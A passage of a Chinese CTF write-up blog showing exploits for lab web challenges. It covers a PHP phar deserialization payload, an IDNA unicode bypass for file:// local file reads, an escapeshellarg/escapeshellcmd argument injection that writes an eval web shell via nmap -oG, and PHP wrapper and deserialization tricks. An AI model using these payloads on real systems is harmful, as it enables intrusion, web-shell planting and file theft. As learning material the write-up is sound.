<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;
    <span class="hljs-keyword">public</span> $db;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;
    <span class="hljs-keyword">public</span> $filename;
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;
    <span class="hljs-keyword">private</span> $files;
    <span class="hljs-keyword">private</span> $results;
    <span class="hljs-keyword">private</span> $funcs;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>&#123;
        $file = <span class="hljs-keyword">new</span> File();
        $file-&gt;filename = <span class="hljs-string">'/flag.txt'</span>;
        <span class="hljs-keyword">$this</span>-&gt;files = <span class="hljs-keyword">array</span>($file);
        <span class="hljs-keyword">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();
        <span class="hljs-keyword">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();
    &#125;
&#125;

@unlink(<span class="hljs-string">"phar.phar"</span>);
$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">"phar.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span>

$phar-&gt;startBuffering();

$phar-&gt;setStub(<span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="hljs-comment">//设置stub</span>

$o = <span class="hljs-keyword">new</span> User();
$o-&gt;db = <span class="hljs-keyword">new</span> FileList();

$phar-&gt;setMetadata($o); <span class="hljs-comment">//将自定义的meta-data存入manifest</span>
$phar-&gt;addFromString(<span class="hljs-string">"exp.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span>
<span class="hljs-comment">//签名自动计算</span>
$phar-&gt;stopBuffering();
<span class="hljs-meta">?&gt;</span></span></code></pre>

<p>最后访问phar.phar/exp.txt就是flag</p>
<h1 id="pythonginx"><a href="#pythonginx" class="headerlink" title="pythonginx"></a>pythonginx</h1><p>首先说一下2019黑帽大会的一个编码问题,其实之前有介绍 unicode编码欺骗,题目中给了</p>
<pre><code class="hljs undefined">@app.route(<span class="hljs-string">'/getUrl'</span>, methods=[<span class="hljs-string">'GET'</span>, <span class="hljs-string">'POST'</span>])
def getUrl():
    url = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">"url"</span>)
    host = parse.urlparse(url).<span class="hljs-built_in">hostname</span>
    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 111"</span>
    parts = <span class="hljs-keyword">list</span>(urlsplit(url))
    host = parts[<span class="hljs-number">1</span>]
    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 222 "</span> + host
    newhost = []
    <span class="hljs-keyword">for</span> h in host.<span class="hljs-keyword">split</span>(<span class="hljs-string">'.'</span>):
        newhost.<span class="hljs-keyword">append</span>(h.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>))
    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">'.'</span>.<span class="hljs-keyword">join</span>(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).<span class="hljs-keyword">split</span>(<span class="hljs-string">' '</span>)[<span class="hljs-number">0</span>]
    host = parse.urlparse(finalUrl).<span class="hljs-built_in">hostname</span>
    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
        <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).<span class="hljs-keyword">read</span>()
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 333"</span></code></pre>

<p>三个host都等于suctf.cc但我们要到最后一个判断就需要编码欺骗了,代码如下</p>
<pre><code class="hljs undefined"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse,urlunsplit,urlsplit
<span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_unicode</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">65536</span>):
        uni=chr(x)
        url=<span class="hljs-string">"http://suctf.c&#123;&#125;"</span>.format(uni)
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">if</span> getUrl(url):
                print(<span class="hljs-string">"str: "</span>+uni+<span class="hljs-string">' unicode: \\u'</span>+str(hex(x))[<span class="hljs-number">2</span>:])
        <span class="hljs-keyword">except</span>:
            <span class="hljs-keyword">pass</span>
 
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getUrl</span><span class="hljs-params">(url)</span>:</span>
    url=url
    host=parse.urlparse(url).hostname
    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    parts=list(urlsplit(url))
    host=parts[<span class="hljs-number">1</span>]
    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    newhost=[]
    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">'.'</span>):
        newhost.append(h.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>))
    parts[<span class="hljs-number">1</span>]=<span class="hljs-string">'.'</span>.join(newhost)
    finalUrl=urlunsplit(parts).split(<span class="hljs-string">' '</span>)[<span class="hljs-number">0</span>]
    host=parse.urlparse(finalUrl).hostname
    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
 
 
<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">'__main__'</span>:
    get_unicode()</code></pre>

<p><img src="https://img-blog.csdnimg.cn/20200206184554866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="unicode"><br>下面就可以file读取<br><code>http://abf40225-aa82-4dde-8e22-2c31ad0a0f42.node3.buuoj.cn/getUrl?url=file://suctf.c%E2%84%82/../../../../..//usr/fffffflag</code></p>
<h1 id="BUUCTF-2018-Online-Tool-escapeshellarg和escapeshellcmd"><a href="#BUUCTF-2018-Online-Tool-escapeshellarg和escapeshellcmd" class="headerlink" title="[BUUCTF 2018]Online Tool(escapeshellarg和escapeshellcmd)"></a>[BUUCTF 2018]Online Tool(escapeshellarg和escapeshellcmd)</h1><pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;
    $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>];
&#125;

<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'host'</span>])) &#123;
    highlight_file(<span class="hljs-keyword">__FILE__</span>);
&#125; <span class="hljs-keyword">else</span> &#123;
    $host = $_GET[<span class="hljs-string">'host'</span>];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5(<span class="hljs-string">"glzjin"</span>. $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]);
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'you are in sandbox '</span>.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    <span class="hljs-keyword">echo</span> system(<span class="hljs-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);
&#125;</span></code></pre>

<p>php中在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的，但是双引号不同 , bash 会将变量名解析成变量的值再使用。<br>对于单个单引号,<br>escapeshellarg 函数转义后,还会在左右各加一个单引号,但 escapeshellcmd 函数是直接加一个转义符，<br>对于成对的单引号, escapeshellcmd 函数默认不转义,但 escapeshellarg 函数转义:<br><img src="https://img-blog.csdnimg.cn/20200209192620837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>传入的参数是<br>127.0.0.1’ -v -d a=1<br>由于escapeshellarg先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：<br>‘127.0.0.1’&#39;‘ -v -d a=1’<br>经过escapeshellcmd针对第二步处理之后的参数中的\以及a=1’中的单引号进行处理转义之后的效果如下所示：<br>‘127.0.0.1’\‘’ -v -d a=1&#39;<br>由于第三步处理之后的payload中的\被解释成了\而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分，具体如下所示：<br>所以这个payload可以简化为curl 127.0.0.1\ -v -d a=1’，即向127.0.0.1\发起请求，POST 数据为a=1’。<br>但是如果是先用 escapeshellcmd 函数过滤,再用的 escapeshellarg 函数过滤,则没有这个问题。<br>如上题的payloads<br><code>?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code><br>注意前后都是有空格的,否则会出现多\<br>转义后<br><code>&#39;&#39;\\&#39;&#39; \&lt;\?php phpinfo\(\)\;\?\&gt; -oG hack.php &#39;\\&#39;&#39;&#39;</code><br>用菜刀连接</p>
<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>假如传入参数<br><code>$text=$_get(&quot;text&quot;);file_get_content($text)</code><br>那么我们该怎么传入$text参数呢<br>我们可以通过data伪协议传入,如果我们传入<br>welcome to the zjctf,就要先base64加密<br>然后<code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code><br>读取php协议可以php伪协议(这一点经常忘)</p>
<pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>  

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span>
    <span class="hljs-keyword">public</span> $file;  
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span><span class="hljs-params">()</span></span>&#123;  
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;  
            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file); 
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
        <span class="hljs-keyword">return</span> (<span class="hljs-string">"U R SO CLOSE !///COME ON PLZ"</span>);
        &#125;  
    &#125;  
&#125;  
<span class="hljs-meta">?&gt;</span></span></code></pre>

<p>反序列化<br>$flag=new Flag();<br>$flag=serialize($flag);<br>echo $flag;<br>然后传参即可<br>注意一点当我们最终传参的时候php的参数不要再用伪协议因为已经读完了</p>

        </div>
      </div>
    </div>
  </div>
</article>



    <!-- Footer -->
<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <p class="copyright text-muted">
          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
        <p class="copyright text-muted">
          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
        </p>
      </div>
    </div>
  </div>
</footer>


    <!-- After Footer Scripts -->
<script src="/disshu.github.io/js/highlight.pack.js"></script>
<script>
  document.addEventListener("DOMContentLoaded", function(event) {
    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
    codeBlocks.forEach(function(block, index) {
      hljs.highlightBlock(block);
    });
  });
</script>

  </body>
</html>

